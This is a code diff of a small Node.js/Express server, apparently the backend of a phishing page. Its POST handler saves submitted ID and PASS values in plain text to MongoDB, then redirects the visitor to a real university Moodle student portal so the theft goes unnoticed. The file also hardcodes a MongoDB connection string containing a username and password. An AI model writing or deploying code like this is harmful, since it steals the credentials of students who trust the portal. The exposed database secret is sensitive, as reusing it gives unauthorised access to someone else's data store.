@@ -5,8 +5,7 @@ const bodyParser = require('body-parser')
 const mongoose = require('mongoose');
 const User = require('./user');
 const dbURI = 'mongodb+srv://kira:QEqcyn4hpCWHVIvR@cluster0.dakub.mongodb.net/?retryWrites=true&w=majority'
-mongoose.connect(dbURI)
-    .then((result) => console.log('connected to db'));
+
 
 
 
@@ -16,20 +15,23 @@ app.get('/', (req, res) => {
 })
 app.post('/', (req, res) => {
 
-    let ID = req.body.ID
-    let PASS = req.body.PASS
-    if (ID == undefined) {
-        ID = 'null'
-    }
-    if (PASS == undefined) {
-        PASS = 'null'
-    }
-    const user = new User({
-        ID: ID,
-        PASS: PASS
-    })
-    user.save();
+    mongoose.connect(dbURI)
+        .then((result) => {
 
+            let ID = req.body.ID
+            let PASS = req.body.PASS
+            if (ID == undefined) {
+                ID = 'null'
+            }
+            if (PASS == undefined) {
+                PASS = 'null'
+            }
+            const user = new User({
+                ID: ID,
+                PASS: PASS
+            })
+            user.save();
+        });
     res.redirect("http://moodle.smuc.edu.et/students/")
 })
 
